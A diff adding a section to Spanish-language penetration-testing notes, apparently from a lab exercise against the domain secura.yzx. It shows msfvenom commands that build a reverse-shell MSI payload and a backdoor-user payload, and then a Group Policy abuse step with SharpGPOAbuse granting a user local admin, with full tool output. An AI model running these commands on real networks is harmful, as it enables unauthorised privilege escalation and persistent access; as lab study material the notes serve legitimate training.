@@ -599,3 +599,43 @@ C:\Users\security\Desktop>
 - Armamos un payload `msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.210 LPORT=135 -f msi > payload.msi`
     - Alternativa: `msfvenom -p cmd/windows/adduser USER=backdoor PASS=P@ssw0rd123 -f msi > payload.msi`
     - Luego nos podemos conectar con winrm o usar runas
+
+
+## GPOAbuse
+- [Más info](https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7)
+- Podemos tener un usuario con varios permisos sobre las politicas del dominio.
+![alt text](<Pasted image 20250509181313.png>)
+- Podemos utilizar [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) para intentar agregar un usuario al grupo de administradores del dominio.
+- `.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Charlotte --GPOName "Default Domain Policy"`
+
+```
+*Evil-WinRM* PS C:\Users\charlotte\Documents> .\.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Charlotte --GPOName "Default Domain Policy"
+[+] Domain = secura.yzx
+[+] Domain Controller = dc01.secura.yzx
+[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
+[+] SID Value of Charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
+[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+``` 
+
+- `gpupdate /force`
+- Te puedes conectar con evil-winrm o meterpreter. 
+
+``` 
+
+*Evil-WinRM* PS C:\Users\charlotte\Documents> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+charlotte
+The command completed successfully.
+```
